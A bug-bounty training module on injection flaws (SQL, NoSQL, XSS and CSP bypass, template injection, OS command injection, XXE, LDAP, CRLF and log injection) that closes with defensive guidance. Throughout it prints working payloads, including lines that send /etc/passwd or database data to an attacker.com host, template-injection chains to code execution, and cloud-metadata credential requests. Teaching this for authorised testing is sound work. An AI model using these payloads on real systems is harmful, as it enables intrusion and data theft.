Injection Attacks Deep Dive

Bug Hunting • Module 06 • Injection

Injection vulnerabilities remain the most consequential class of web application flaws. When user-controlled data crosses a trust boundary and is interpreted as code, commands, or queries, the result ranges from full database compromise to remote code execution on the underlying server. This module moves beyond surface-level detection into advanced exploitation chains — UNION-based extraction, blind inference, template injection to RCE, XXE exfiltration, and the filter bypass techniques required when WAFs and sanitization stand between you and a confirmed finding.

Section 01

SQL Injection Exploitation Chains

SQL injection occurs when user input is concatenated directly into a SQL query string without parameterization or adequate escaping. The attack surface includes GET/POST parameters, HTTP headers (Cookie, Referer, User-Agent, X-Forwarded-For), JSON/XML request bodies, and any value that ultimately reaches a SQL interpreter. Detection begins with probe payloads; exploitation follows a methodical escalation from confirming the vulnerability to extracting the entire database schema and contents.

Detection Probes

The initial goal is to determine whether user input influences query execution. Each probe targets a different behavioral signal — syntax errors, boolean differences, or timing delays.

# Classic single-quote error trigger GET /products?id=1' # Expected: 500 error, SQL syntax error in response body or different page length # Boolean-based detection pair GET /products?id=1 AND 1=1 # True condition — normal response GET /products?id=1 AND 1=2 # False condition — different response (empty, error, redirect) # Time-based detection (MySQL) GET /products?id=1 AND SLEEP(5) # Response delayed by ~5 seconds confirms injection # Time-based detection (PostgreSQL) GET /products?id=1; SELECT pg_sleep(5)-- # Time-based detection (MSSQL) GET /products?id=1; WAITFOR DELAY '0:0:5'--

Error-Based Extraction

When the application reflects database error messages in the response, you can force the database to include sensitive data inside the error output. This is the fastest extraction method because each request returns data directly.

# MySQL: extractdb() via XPATH error 1' AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e))-- - # MySQL: updatexml() variant 1' AND updatexml(1, concat(0x7e, (SELECT user()), 0x7e), 1)-- - # PostgreSQL: cast error leaks data 1' AND 1=CAST((SELECT version()) AS int)-- - # MSSQL: convert error leaks data 1' AND 1=CONVERT(int, (SELECT @@version))-- -

UNION-Based Extraction

UNION-based SQLi appends a second SELECT statement to the original query, allowing you to extract data from any table the database user can access. The technique requires three prerequisite steps: determining the column count, identifying which columns are reflected in output, and matching data types.

# Step 1: Determine column count with ORDER BY 1' ORDER BY 1-- - # OK 1' ORDER BY 2-- - # OK 1' ORDER BY 3-- - # OK 1' ORDER BY 4-- - # Error — table has 3 columns # Alternative: NULL-based column count 1' UNION SELECT NULL-- - # Error 1' UNION SELECT NULL,NULL-- - # Error 1' UNION SELECT NULL,NULL,NULL-- - # OK — 3 columns # Step 2: Identify reflected columns 1' UNION SELECT 'aaa','bbb','ccc'-- - # Check response body for 'aaa', 'bbb', 'ccc' to see which positions render # Step 3: Extract database version via reflected column (position 2) 1' UNION SELECT NULL,version(),NULL-- - # Step 4: Enumerate tables (MySQL) 1' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()-- - # Step 5: Enumerate columns of a target table 1' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users'-- - # Step 6: Extract data 1' UNION SELECT NULL,GROUP_CONCAT(username,0x3a,password),NULL FROM users-- -

Blind Boolean-Based Extraction

When the application does not display errors or query results, but responds differently to true versus false conditions, you extract data one bit or character at a time by asking yes/no questions about the database contents.

# Is the first character of the database name greater than 'm'? 1' AND (SELECT SUBSTRING(database(),1,1)) > 'm'-- - # Binary search narrows each character in ~7 requests 1' AND (SELECT SUBSTRING(database(),1,1)) > 's'-- - # True 1' AND (SELECT SUBSTRING(database(),1,1)) > 'v'-- - # False 1' AND (SELECT SUBSTRING(database(),1,1)) > 't'-- - # True 1' AND (SELECT SUBSTRING(database(),1,1)) = 'u'-- - # True — first char is 'u' # Extract table count 1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) > 5-- -

Time-Based Blind Extraction

When even boolean differences are not observable — identical responses for true and false conditions — timing becomes the side channel. You instruct the database to sleep conditionally, then measure response latency.

# MySQL time-based blind: if first char of db name is 'u', sleep 5 seconds 1' AND IF(SUBSTRING(database(),1,1)='u', SLEEP(5), 0)-- - # PostgreSQL time-based blind 1'; SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='p') THEN pg_sleep(5) ELSE pg_sleep(0) END-- - # MSSQL time-based blind 1'; IF (SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:5'-- -

Second-Order SQL Injection

In second-order SQLi, the malicious payload is stored in the database during one operation (registration, profile update) and executed later in a different query context (admin panel, reporting, password reset). The injection point and the execution point are in different request flows, making it invisible to automated scanners that only test single request-response pairs.

# Step 1: Register with a crafted username POST /register username=admin'-- -&password=anything&email=test@test.com # Step 2: Trigger password change (backend query uses stored username) POST /change-password current_password=anything&new_password=hacked123 # Backend executes: # UPDATE users SET password='hacked123' WHERE username='admin'-- -' # The WHERE clause targets the real admin account

Out-of-Band (OOB) Extraction

When all in-band channels are blocked — no errors, no boolean differences, no timing variations — OOB techniques force the database to make an external network request carrying extracted data. This requires the database server to have outbound network access, typically DNS or HTTP.

# MySQL OOB via LOAD_FILE + DNS (Windows only) 1' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT version()), '.attacker.com\\a'))-- - # MSSQL OOB via xp_dirtree + DNS 1'; DECLARE @d VARCHAR(1024); SET @d=(SELECT version()); EXEC('master..xp_dirtree "\\' + @d + '.attacker.com\a"')-- - # Oracle OOB via UTL_HTTP 1' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual-- - # PostgreSQL OOB via COPY ... TO PROGRAM 1'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/?d='||version()-- -
OOB Prerequisites
OOB extraction requires outbound network access from the database server. Many production environments block outbound connections at the firewall level. DNS-based OOB has a higher success rate than HTTP because DNS egress is rarely filtered. Use a Burp Collaborator or interactsh listener to capture callbacks.

Section 02

🗂 NoSQL Injection

NoSQL databases — MongoDB, CouchDB, Redis, Cassandra — use different query languages and data models than relational databases, but the fundamental injection principle is identical: when user input is incorporated into a query without validation, an attacker can modify the query semantics. MongoDB is the most commonly targeted NoSQL database in bug bounty programs because of its prevalence in Node.js applications and the way its query operators map to JSON structures that overlap with HTTP parameter parsing.

MongoDB Operator Injection

MongoDB queries use JSON-like documents with special operators prefixed by $. When an application passes user input directly into a MongoDB query object, an attacker can inject these operators to alter the query logic. This is especially common when Express.js or similar frameworks parse nested objects from query strings or JSON bodies.

# Normal login request POST /api/login Content-Type: application/json {"username": "admin", "password": "secret123"} # Backend query (vulnerable) db.users.find({username: req.body.username, password: req.body.password}) # Authentication bypass with $ne (not equal) {"username": "admin", "password": {"$ne": ""}} # Query becomes: find where username=admin AND password != "" # Returns the admin user without knowing the password # Authentication bypass with $gt (greater than) {"username": {"$gt": ""}, "password": {"$gt": ""}} # Returns the first user where both fields are non-empty # Data extraction with $regex {"username": "admin", "password": {"$regex": "^s"}} # True if password starts with 's' — enumerate character by character {"username": "admin", "password": {"$regex": "^se"}} {"username": "admin", "password": {"$regex": "^sec"}}

URL-Encoded Operator Injection

When the backend uses a query string parser that supports bracket notation (common in Express.js with qs), operators can be injected through URL parameters without sending JSON.

# URL-encoded operator injection via GET parameters GET /api/login?username=admin&password[$ne]= # URL-encoded via POST form data POST /api/login Content-Type: application/x-www-form-urlencoded username=admin&password[$ne]=&password[$exists]=true # Enumerate all usernames with $regex GET /api/users?username[$regex]=^a&password[$gt]=

Server-Side JavaScript Injection ($where)

MongoDB's $where operator evaluates JavaScript expressions on the server. If an attacker can inject into a $where clause, they achieve arbitrary JavaScript execution within the MongoDB process — far more powerful than simple query manipulation.

# $where injection for authentication bypass {"username": {"$where": "return true"}} # Time-based detection via $where {"username": {"$where": "sleep(5000) || true"}} # Data exfiltration via $where + timed side channel {"$where": "if(this.username=='admin' && this.password.charAt(0)=='s') { sleep(5000); }"}

NoSQL vs SQL Injection Comparison

Aspect SQL Injection NoSQL Injection

ℹ
Testing for NoSQL Injection
Always test both JSON content types and URL-encoded parameters. Many applications accept JSON on API endpoints but URL-encoded data on traditional form endpoints. The same backend code may be vulnerable through one content type but not the other depending on how the framework parses input.

XSS Filter Bypass & WAF Evasion

Cross-site scripting in modern applications is rarely as simple as injecting <script>alert(1)</script>. Applications deploy input filters, output encoding, Content Security Policy headers, and Web Application Firewalls that block known XSS patterns. Successful exploitation requires understanding exactly what the filter blocks and finding a representation of your payload that passes through the filter but is still interpreted as executable code by the browser.

Common Filter Patterns and Bypasses

Filter Rule What It Blocks Bypass Technique
Strip <script> Removes script tags <scr<script>ipt>, <SCRIPT>, <img onerror=...>
Block alert() Filters the word "alert" confirm(), prompt(), window['al'+'ert'](1)
Block parentheses Removes ( and ) <img onerror=alert`1`> (template literals)
Block on* attributes Strips event handlers <svg/onload=...>, <body onpageshow=...>, <details open ontoggle=...>
Block quotes Removes single/double quotes <img onerror=alert(1)> (no quotes needed), backtick notation
Keyword blacklist Blocks "javascript:", "onerror", "onload" Case mixing, null bytes, tab/newline insertion: java script:

When common event handlers like onerror and onload are filtered, dozens of alternative handlers exist across different HTML elements.

CSP Bypass Techniques

Content Security Policy (CSP) is the strongest browser-side defense against XSS. However, misconfigured CSPs are common and can be bypassed in several ways.

Unsafe-inline
If the CSP includes script-src 'unsafe-inline', inline scripts and event handlers execute freely. This directive effectively nullifies CSP for XSS protection. Common in legacy applications that added CSP without refactoring their JavaScript.
Misconfiguration
Whitelisted CDNs
If the CSP whitelists a CDN that hosts user-uploadable content or JSONP endpoints, you can load your payload from the whitelisted domain. cdnjs.cloudflare.com hosts Angular which enables template injection bypasses.
CDN Abuse
Base-URI Missing
If the CSP does not include a base-uri directive, injecting <base href="https://attacker.com/"> redirects all relative script imports to load from your controlled domain.
Base Hijacking
JSONP Endpoints
JSONP endpoints on whitelisted domains accept a callback parameter that wraps the response in a function call. If you control the callback name, you can execute arbitrary JavaScript through a script src pointing to the JSONP URL.
JSONP Gadget
# CSP bypass via Angular on whitelisted CDN # CSP: script-src cdnjs.cloudflare.com <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script> <div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div> # CSP bypass via JSONP on whitelisted domain # CSP: script-src accounts.google.com <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)//"></script> # CSP bypass via base tag (when base-uri is not restricted) <base href="https://attacker.com/"> # All relative script paths now resolve to attacker.com

DOM Clobbering

DOM clobbering exploits the browser behavior where named HTML elements (elements with id or name attributes) are accessible as properties of the window and document objects. By injecting HTML elements with specific names, you can overwrite variables that the application's JavaScript reads, altering its control flow.

# Application code checks: if (window.config) { ... } # Clobber window.config with an anchor tag <a id="config" href="javascript:alert(1)"></a> # Clobber nested property: window.config.url <form id="config"><input id="url" value="javascript:alert(1)"></form> # Clobber toString via anchor href <a id="config" href="cid:alert(1)"></a> # window.config.toString() returns "cid:alert(1)"

Mutation XSS (mXSS)

Mutation XSS occurs when a sanitizer processes HTML, producing output that it considers safe, but the browser re-parses and mutates the DOM structure in a way that introduces executable code. The sanitizer and the browser disagree about the meaning of the same HTML string.

# mXSS via namespace confusion (SVG/math) <math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>--></style></mglyph></table></mtext></math> # mXSS via p tag auto-closing behavior <p><style><p title="</style><img src=x onerror=alert(1)>">

Polyglot Payloads

A polyglot XSS payload is designed to execute in multiple injection contexts simultaneously — HTML attribute, JavaScript string, URL parameter, and more. Useful when you are unsure which context your input lands in.

# Multi-context polyglot jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
Responsible XSS Testing
Never use alert() with sensitive data or on production systems in ways that could disrupt users. Use alert(document.domain) to prove execution context without accessing user data. For stored XSS, use a payload that only fires for your session. Document the impact chain clearly in your report.
Section 04

Server-Side Template Injection (SSTI)

Server-Side Template Injection occurs when user input is embedded directly into a template string that is processed by a server-side template engine. Unlike XSS, which executes in the browser, SSTI executes on the server, meaning successful exploitation typically leads to Remote Code Execution (RCE), file system access, and full server compromise. Template engines are designed to be expressive — they intentionally provide access to programming constructs — which makes them exceptionally dangerous when user input reaches them.

Detection Methodology

The detection approach uses mathematical expressions that template engines evaluate but that have no meaning in plain HTML. If the server returns the computed result instead of the literal string, the input is being processed by a template engine.

# Universal detection probes {{7*7}} # Returns "49" if Jinja2, Twig, or similar ${7*7} # Returns "49" if Freemarker, Mako, or EL #{7*7} # Returns "49" if Ruby ERB or Thymeleaf <%= 7*7 %> # Returns "49" if ERB or EJS {{7*'7'}} # Returns "7777777" in Jinja2, "49" in Twig — engine fingerprinting # Fingerprinting decision tree # {{7*'7'}} = 7777777 → Jinja2 (Python) # {{7*'7'}} = 49 → Twig (PHP) # ${7*7} = 49 → Freemarker (Java) or Mako (Python) # #{7*7} = 49 → Thymeleaf (Java) or ERB (Ruby)

Jinja2 Exploitation Chain (Python)

Jinja2 is the most commonly encountered template engine in bug bounty targets because of Flask's prevalence. The exploitation chain starts with accessing the Python object hierarchy through template expressions, climbing from string objects to the base object class, enumerating subclasses, and finding one that provides access to os or subprocess.

# Step 1: Access config object (often contains SECRET_KEY) {{config}} {{config.items()}} # Step 2: Access the class hierarchy {{''.__class__}} # <class 'str'> {{''.__class__.__mro__}} # (<class 'str'>, <class 'object'>) {{''.__class__.__mro__[1]}} # <class 'object'> {{''.__class__.__mro__[1].__subclasses__()}} # List of all loaded classes # Step 3: Find a useful subclass (index varies by environment) # Look for: subprocess.Popen, os._wrap_close, warnings.catch_warnings {{''.__class__.__mro__[1].__subclasses__()[INDEX]}} # Step 4: RCE via os.popen (through _wrap_close) {{''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['os'].popen('id').read()}} # Step 5: RCE via subprocess.Popen {{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()}} # Alternative: use request object {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} # Alternative: bypass filters using |attr() {{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(INDEX)}}

Twig Exploitation (PHP)

# Detection {{7*7}} # Returns 49 {{7*'7'}} # Returns 49 (differs from Jinja2's 7777777) # Environment information {{_self.env.display('id')}} # Twig 1.x RCE {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}} # Twig 3.x RCE via filter {{['id']|filter('system')}} {{['cat /etc/passwd']|filter('system')}} # Twig: map function for RCE {{['id']|map('passthru')}}

Section 05

Command Injection

OS command injection occurs when an application passes user-controlled data to a system shell. The application may intend to execute a single command with the user input as an argument, but shell metacharacters allow the attacker to append, chain, or substitute additional commands. The impact is always critical — direct operating system access at the privilege level of the web application process.

Shell Metacharacter Chaining

Different metacharacters have different semantics in how they chain commands together. Understanding these differences is essential for crafting payloads that work in different injection contexts.

# Semicolon: execute sequentially regardless of previous result 127.0.0.1; id # Pipe: pipe stdout of first command to second 127.0.0.1 | id # AND: execute second only if first succeeds (exit code 0) 127.0.0.1 && id # OR: execute second only if first fails (non-zero exit code) || id # Backtick substitution: inner command executes first, output replaces backticks 127.0.0.1 `id` # $() substitution: same as backticks, modern syntax 127.0.0.1 $(id) # Newline: many parsers treat newline as command separator 127.0.0.1%0aid # Typical vulnerable code (Python) os.system("ping -c 1 " + user_input) # Input: 127.0.0.1; cat /etc/passwd # Executes: ping -c 1 127.0.0.1; cat /etc/passwd

Blind Command Injection

When the application does not return command output in the response, you must use out-of-band or timing techniques to confirm execution and extract data.

# Time-based detection 127.0.0.1; sleep 10 127.0.0.1 && sleep 10 127.0.0.1 | sleep 10 # DNS exfiltration (confirm execution and extract data) 127.0.0.1; nslookup $(whoami).attacker.com 127.0.0.1; dig $(hostname).attacker.com 127.0.0.1; curl http://attacker.com/$(whoami) # HTTP exfiltration of file contents 127.0.0.1; curl http://attacker.com/?d=$(cat /etc/passwd | base64 | tr -d '\n') # Write output to accessible web directory 127.0.0.1; id > /var/www/html/output.txt # Burp Collaborator / interactsh detection 127.0.0.1; nslookup burpcollaborator-id.oastify.com 127.0.0.1; curl https://interactsh-id.interact.sh

Filter Bypass Techniques

Applications often implement blacklists that block spaces, common command names, or special characters. Each filter has known bypass methods.

# Space bypass with $IFS (Internal Field Separator) cat${IFS}/etc/passwd cat$IFS$9/etc/passwd # Space bypass with tab (%09) cat%09/etc/passwd # Space bypass with brace expansion {cat,/etc/passwd} # Command name bypass with variable substitution a=c;b=at;$a$b /etc/passwd $(printf '\x63\x61\x74') /etc/passwd # Command name bypass with wildcards /bin/c?t /etc/passwd /bin/ca* /etc/passwd /???/??t /etc/passwd # Slash bypass cat ${HOME:0:1}etc${HOME:0:1}passwd # Quote insertion (ignored by shell, breaks regex filters) c''at /etc/passwd c""at /etc/passwd # Backslash insertion c\at /etc/passwd # Newline bypass (%0a) %0acat%20/etc/passwd # Encoding combined: tab + variable + wildcard a=ca;${a}t%09/etc/pass*

Injection Through Different Contexts

► Common Injection Points

  • ‣ Filename parameters (image processing, PDF generation)
  • ‣ Network tool wrappers (ping, traceroute, nslookup, whois)
  • ‣ File path arguments (backup, archive, log viewing)
  • ‣ Git/SVN operations (repository URL, branch name)
  • ‣ Email sending (recipient, subject, body via sendmail)
  • ‣ User-Agent / Referer headers (logged and processed)

► Argument Injection

  • ‣ When input is used as a flag argument, not a new command
  • ‣ curl: -o /tmp/shell.php writes to file
  • ‣ tar: --checkpoint-action=exec=id
  • ‣ find: -exec id \;
  • ‣ git: --upload-pack=id
  • ‣ Use -- to terminate flag parsing in the app
Windows Command Injection
Windows uses different metacharacters: & (chain), | (pipe), && / || (conditional), and %0a (newline). The $IFS technique does not work on Windows. Use %COMSPEC% or cmd /c for shell access. Test both cmd.exe and powershell.exe contexts.

📃 XML External Entity (XXE)

XML External Entity injection exploits the XML parser's entity expansion feature. When an application parses XML input without disabling external entity resolution, an attacker can define entities that reference local files, internal network resources, or external URLs. The parser resolves these entities during parsing, and the result — file contents, SSRF responses, or error messages — may be reflected in the application's output or exfiltrated out-of-band.

Classic XXE for File Read

<!-- Basic file read via external entity --> <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <root> <data>&xxe;</data> </root> <!-- Read source code (use PHP wrapper to base64 encode) --> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php"> ]> <root><data>&xxe;</data></root> <!-- Windows file read --> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]> <root><data>&xxe;</data></root> <!-- Directory listing (Java parsers) --> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/www/html/"> ]> <root><data>&xxe;</data></root>

Blind XXE with OOB Exfiltration

When the application does not reflect entity values in the response, you use parameter entities to force the parser to make an outbound request carrying file contents. This requires hosting a malicious DTD on an attacker-controlled server.

<!-- Step 1: Payload sent to target --> <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd; ]> <root><data>test</data></root> <!-- Step 2: evil.dtd hosted on attacker.com --> <!ENTITY % file SYSTEM "file:///etc/hostname"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>"> %eval; %exfil; <!-- The parser loads evil.dtd, reads /etc/hostname into %file, constructs a URL containing the file data, and requests it --> <!-- Error-based OOB (when outbound HTTP is blocked but errors are verbose) --> <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; %error; <!-- Parser error includes file contents in the "file not found" message -->

XXE Through File Upload

XML is embedded in many file formats. Applications that process uploads of SVG images, DOCX/XLSX/PPTX documents, or any XML-based format may be vulnerable to XXE even when they do not expose an obvious XML API endpoint.

<!-- SVG file with XXE (upload as profile picture, etc.) --> <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]> <svg xmlns="http://www.w3.org/2000/svg" width="200" height="200"> <text x="10" y="50" font-size="16">&xxe;</text> </svg> <!-- DOCX XXE: unzip the .docx, modify word/document.xml, rezip --> unzip document.docx -d docx_contents # Edit docx_contents/word/document.xml to include DOCTYPE with ENTITY # Rezip: cd docx_contents && zip -r ../malicious.docx . <!-- XLSX XXE: same approach with xl/sharedStrings.xml or xl/workbook.xml --> unzip spreadsheet.xlsx -d xlsx_contents # Edit xlsx_contents/xl/workbook.xml with XXE payload cd xlsx_contents && zip -r ../malicious.xlsx .

XXE to SSRF

External entities can reference internal network resources, turning XXE into SSRF. This allows scanning internal ports, accessing cloud metadata endpoints, and reaching services that are not exposed to the internet.

<!-- Access AWS metadata endpoint --> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]> <root><data>&xxe;</data></root> <!-- Scan internal ports --> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/"> ]> <root><data>&xxe;</data></root> <!-- Access internal API --> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-api.corp:3000/admin/users"> ]> <root><data>&xxe;</data></root>

Parameter Entity Restrictions
Many modern XML parsers disable general external entities but still process parameter entities (the % syntax used within DTDs). If a basic &xxe; entity does not work, try parameter entities with an external DTD. Also try XInclude, which uses a different mechanism than DTD entities and may be processed even when external entities are disabled.
Section 07

📑 LDAP & Header Injection

Beyond SQL and template engines, injection vulnerabilities exist in every protocol and data format where user input is concatenated into structured queries or messages. LDAP directories, HTTP headers, email headers, and application logs are all attack surfaces when input is not properly sanitized before incorporation.

LDAP Injection

LDAP (Lightweight Directory Access Protocol) is used by organizations for authentication, user lookup, and directory services. When applications construct LDAP search filters using unsanitized user input, the filter logic can be manipulated to bypass authentication or extract directory information.

# Normal LDAP search filter (&(uid=john)(userPassword=secret)) # Authentication bypass: inject always-true condition # Username input: * # Password input: * (&(uid=*)(userPassword=*)) # Matches any user with any password — returns first entry # Authentication bypass: close filter early # Username input: admin)(&) (&(uid=admin)(&))(userPassword=anything)) # The (&) is always true, password check becomes part of a dead filter # Wildcard enumeration # Username input: a* (&(uid=a*)(objectClass=person)) # Returns all users starting with 'a' — iterate through the alphabet # Attribute extraction via OR injection # Input: *)(mail=* (&(uid=*)(mail=*)(objectClass=person)) # Enumerates email addresses by checking which exist # Null byte to truncate (older LDAP implementations) # Username input: admin)%00 (&(uid=admin)%00)(userPassword=anything)) # Everything after %00 is ignored

HTTP Header Injection (CRLF Injection)

HTTP headers are separated by CRLF sequences (\r\n or %0d%0a). When user input is reflected in a response header without stripping these characters, an attacker can inject arbitrary headers or even inject a response body, enabling response splitting, cache poisoning, or XSS.

# Vulnerable redirect: Location header includes user input GET /redirect?url=http://example.com%0d%0aX-Injected-Header:%20true # Response becomes: HTTP/1.1 302 Found Location: http://example.com X-Injected-Header: true # Inject Set-Cookie header (session fixation) GET /redirect?url=http://example.com%0d%0aSet-Cookie:%20session=attacker_controlled # Full response splitting: inject body after double CRLF GET /redirect?url=http://example.com%0d%0a%0d%0a<html><script>alert(document.domain)</script></html> # Cache poisoning via header injection # If a cache server stores the split response, all subsequent users receive the injected content # Test vectors for CRLF %0d%0a # URL-encoded CRLF %0a # Just LF (works on many servers) %E5%98%8A # Unicode CRLF equivalent (UTF-8 encoded) \r\n # Literal (if input is processed by an interpreter)

Email Header Injection

When an application sends email using user-supplied values in header fields (To, CC, BCC, Subject), injecting newlines allows adding arbitrary recipients or headers, turning a contact form into an open spam relay.

# Normal contact form sends email to support@company.com # Inject CC header via the "From" or "Subject" field # Subject field injection Subject: Hello%0aCc: victim@target.com%0aBcc: attacker@evil.com # From field injection From: user@test.com%0aCc: victim1@target.com%0aCc: victim2@target.com # Inject email body (add blank line then content) Subject: Hello%0a%0aInjected email body content here # PHP mail() specific: additional headers via 5th parameter # If the application passes user input as the $additional_headers parameter: -X/var/www/html/shell.php # Writes the email log to a PHP file accessible via web

Log Injection

When user input appears in application logs without sanitization, an attacker can inject newlines to forge log entries, inject ANSI escape sequences to exploit terminal-based log viewers, or in the case of logging frameworks with expression evaluation, achieve remote code execution.

# Forge a log entry (inject newline + fake log line) # Input in username field: admin%0a[2026-02-28 12:00:00] INFO: User admin logged in successfully from 10.0.0.1 # Application log shows: [2026-02-28 12:00:01] WARN: Failed login for user admin [2026-02-28 12:00:00] INFO: User admin logged in successfully from 10.0.0.1 # ANSI escape injection (terminal viewers) admin\x1b[2J\x1b[1;1H # Clears terminal screen
Log4Shell Reference (CVE-2021-44228)
The Log4Shell vulnerability demonstrated the catastrophic impact of injection through logging. Log4j 2.x evaluated JNDI lookup expressions in log messages: ${jndi:ldap://attacker.com/a}. When a server logged user-controlled input (User-Agent, URL parameters, form fields) through Log4j, the expression triggered an outbound LDAP/RMI connection that loaded and executed arbitrary Java classes. This turned every logged input field into an RCE vector. Always check for JNDI expression evaluation: ${jndi:dns://collaborator.com} in any header or parameter that might be logged.
Section 08

Injection Defense & Testing Strategy

Understanding defenses is essential for two reasons: it tells you what to look for when testing (gaps in the defense), and it strengthens the remediation section of your reports. A finding with clear, actionable remediation advice is triaged faster and earns more respect from the program's engineering team.

Parameterized Queries

Parameterized queries (prepared statements) are the definitive defense against SQL injection. They separate the query structure from the data, ensuring that user input is always treated as a literal value and never as SQL syntax. Every major language and framework provides this capability.

# VULNERABLE: string concatenation cursor.execute("SELECT * FROM users WHERE id = " + user_id) # SAFE: parameterized query (Python / psycopg2) cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,)) # SAFE: parameterized query (Java / PreparedStatement) PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?"); stmt.setInt(1, userId); # SAFE: parameterized query (Node.js / mysql2) connection.execute("SELECT * FROM users WHERE id = ?", [userId]); # SAFE: ORM (Python / SQLAlchemy) User.query.filter_by(id=user_id).first() # STILL VULNERABLE: ORM with raw query User.query.filter("id = " + user_id) # Never do this

Input Validation vs Output Encoding

► Input Validation

  • ‣ Validate type, length, range, and format at entry point
  • ‣ Use allowlists over denylists: define what IS allowed, not what is blocked
  • ‣ Reject unexpected characters for structured fields (IDs, emails, dates)
  • ‣ Cast to expected type before use (parseInt, type hints)
  • ‣ Does NOT prevent injection alone — defense in depth layer

► Output Encoding

  • ‣ Encode data at the point of output, matching the output context
  • ‣ HTML context: encode < > & " '
  • ‣ JavaScript context: hex-encode non-alphanumeric characters
  • ‣ URL context: percent-encode special characters
  • ‣ CSS context: hex-encode for property values

WAF vs Application-Level Defense

Aspect WAF (Network Layer) Application Layer
Approach Pattern matching on HTTP traffic (regex, signatures) Parameterized queries, type-safe APIs, encoding functions
Bypass Risk High — encoding, case variation, protocol tricks Low — correct implementation eliminates the vulnerability class
Maintenance Rules must be updated as new bypass techniques emerge Secure by default once the framework enforces the pattern
False Positives High — legitimate input may match attack signatures None — parameterized queries handle all input correctly
Role Virtual patching, defense in depth, logging/alerting Root cause fix, eliminates vulnerability at the source
ℹ
WAFs Are Speed Bumps, Not Walls
In your bug reports, note when a WAF is present but can be bypassed. Programs value this information because it demonstrates that their WAF provides a false sense of security. Recommend application-level fixes as the primary remediation and WAF rules as a temporary mitigation while the code fix is deployed.

Systematic Testing Methodology

A structured approach to injection testing ensures coverage and prevents wasted effort. Work through each injection class systematically for every input vector.

  • Map all input vectors. Identify every parameter, header, cookie, file upload, and WebSocket message that reaches the server. Use Burp Suite's site map and parameter analysis to build a comprehensive list.
  • Classify each input by context. Determine where the input is used: SQL query, template render, OS command, XML parser, LDAP filter, HTTP header, or log output. The context dictates which payloads to test.
  • Test with detection probes first. Send the simplest possible probe for each injection class and observe the response. Single quote for SQLi, {{7*7}} for SSTI, %0d%0a for CRLF, and so on.
  • Confirm with a second, different probe. A single anomalous response could be a coincidence. Confirm injection with a different payload that produces a predictable, different result. Boolean pairs, mathematical expressions, or time delays provide reliable confirmation.
  • Escalate to demonstrate impact. Extract data, read files, or achieve code execution to prove the severity. The difference between an informational finding and a critical finding is often just the exploitation depth documented in the report.
  • Document the full chain. Record every request and response in your report. Include the raw HTTP requests, not just parameter values. Show the progression from detection to data extraction. Screenshots of extracted data prove impact unambiguously.
  • Test WAF/filter bypasses last. If initial probes are blocked, identify the filter pattern and test the bypass techniques covered in this module. Document what the WAF blocks and what passes through.
